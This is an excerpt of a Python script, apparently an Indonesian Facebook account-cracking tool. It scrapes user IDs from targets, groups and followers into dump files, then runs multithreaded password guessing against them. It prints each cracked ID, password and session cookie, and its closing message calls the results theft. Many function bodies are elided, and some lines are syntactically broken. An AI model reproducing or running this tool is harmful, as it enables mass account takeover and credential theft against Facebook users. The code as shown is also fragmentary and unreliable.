...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t( ͠° ͟ʖ ͡°) Greetings from Binjay : [green]🇨 🇴 🇰 🇮  [white] (;´༎ຶٹ༎ຶ`)'))
		...
		print(f'  %s[%sx%s]%sLOGIN FAILED....  !!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		...
		print('[×] Cookies have been modified ')
		time.sleep(2)
		login_lagi334()
	os.system('clear')
	banner()
	...
	print(h+ '>> version : 2,0' )
	print (h+">>"+p+" IP: "+k+ip)
	cetak(nel('\tspecific [green]%s[white]CRACK IT RIGHT,NTR SPAM IP LU SALAHIN GUA'%(my_name))) 
...
def result():
	...
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {my cp[0]} PASSWORD : {my cp[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {x}{my cp[2]}')
				nocp +=1
			input('Click Enter ]')
			back()
	elif kz in ['0','00']:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('➪ How many IDs do you want ? : '))
	except ValueError:
	...
	for met in range(jum):
		yz+=1
		kl = input('➪ Enter the Id To '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
...
def dump_pengikut():
	try:
		...
		exit()
	print('>> Tap (me) If You Want To Crack Your Own Followers ')
	pil = input('>> Enter the Target Idz : ')
	try:
...
def lah():
	...
	input(balmond+m +"\x1b[1;97m Klik [\x1b[1;96m Enter ]\x1b[1;97m If you want to crack directly !!")
	pass
	setting()
def grup():
	print('')
	id = input(""+balmond+h+" \x1b[1;94m>> Enter the Group Idz :\x1b[1;94m ")
	...
	try:
		...
		print(balmond+m+" Internet Connection Lost..")
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Public Group","")
	if berr2=='Log in to Facebook':
...
def grup1(urls):
	use = []
	ses = requests.Session()
	print(""+balmond+m+" \x1b[1;94mIf Stopped, Airplane Mode 5 Seconds")
		...
		try:
			...
			for cari in tes:
				...
				if 'mengajukan' in spl:
					...
					namayou = liatnih.replace(' ask questions .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Process of Taking ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					...
					if idku in id:
						...
						id.append(idku)
						print(("\r"+balmond+h+" { "+O+"Collecting IDs "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
...
def crack_file():
	try:vin = os.listdir('DUMP')
		...
		back()
	if len(vin)==0:
		print('>> You Dont Have a Dump File')
		time.sleep(2)
		back()
	else:
		cih = 0
		...
		try:geh = lol[geeh]
			...
			print(f'{k}>> Choose the Right Option {x}')
			time.sleep(3)
			back()
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print(f'{x}>> 1. old account (NOT RECOMMENDED) ')
	print('>> 2. New account ')
	print('>> 3. Random ')
	print('')
	hu = input('>> Select : ')
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} The Sun is Shifting {m}•{k}•{h}•{x} <<<<< ')
	print('')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]>>[green] Crack Finished wey, just be thankful for the result of the theft if you want to print it xix[cyan] <<[white] '))
